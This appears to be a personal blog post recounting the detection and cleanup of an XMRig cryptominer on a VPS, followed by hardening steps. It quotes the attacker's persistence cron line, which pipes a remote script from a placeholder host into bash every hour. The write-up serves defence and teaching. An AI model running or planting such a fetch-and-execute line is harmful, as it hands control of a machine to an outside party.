---
title: "Hunting a Cryptominer on My VPS"
slug: "vps-cryptomining-compromise"
description: "A quick investigation into a root-level XMRig cryptomining compromise: how we detected, analyzed, and mitigated it."
date: "2026-01-02"
tags: ["linux", "security", "sysadmin", "malware"]
cover: "/images/blogs/htop-server.png"
featured: false
---

I logged into my personal VPS and noticed things felt unusually sluggish. A quick run of `htop` confirmed it: my CPU was pinned at 100% saturation. 

Most compromises don’t crash your system anymore—they silently monetize it. Here is how I tracked down, killed, and patched an active XMRig cryptomining process running under root.

---

## Detection & Process Analysis

A quick look at the process tree showed a strange binary running as root, consuming nearly every available cycle. It was actively communicating with external mining pools.

To see what was going on, I checked the `/proc` directory for the PID of the miner:

```bash
ls -la /proc/<PID>/exe
```

This pointed directly to a hidden binary tucked away in `/tmp`. The attacker had dropped it there, executed it, and then deleted the binary from disk to make standard listing harder (resulting in a `(deleted)` label in `/proc`).

---

## Live Mitigation & Tracing

I mitigated the issue live in four quick steps:

1. **Terminated the Miner:** Killed the processes immediately using `kill -9`.
2. **Blocked Connections:** Blocked outbound connections to the mining pool endpoints using `iptables` rules.
3. **Removed Persistence:** Audited cron jobs (`crontab -l`, `/etc/cron*`), systemd services, and startup hooks (`/etc/rc.local`). Sure enough, the attacker had injected a cron job to redownload and relaunch the miner every hour:
   ```bash
   0 * * * * curl -s http://untrusted-source.xyz/miner.sh | bash
   ```
4. **Cleaned Up Files:** Removed all associated cron entries, scripts, and temporary files.

---

## Hardening the Host

With CPU usage normalized, the next step was figuring out how they got in. A review of `/var/log/auth.log` revealed brute-force attempts on a weakly configured service container.

To prevent re-entry, I:
* Tightened permissions on critical directories.
* Hardened SSH configurations (disabled password authentication entirely, forcing SSH key authentication).
* Installed and configured `fail2ban` to automatically jail suspicious IP addresses.
* Segmented Docker network accesses to ensure compromised containers couldn't touch the host shell.

## Takeaway

Most modern server breaches aren't loud defacements; they are quiet resource drains. Monitor your system load aggressively, audit your logs regularly, and always assume breach.
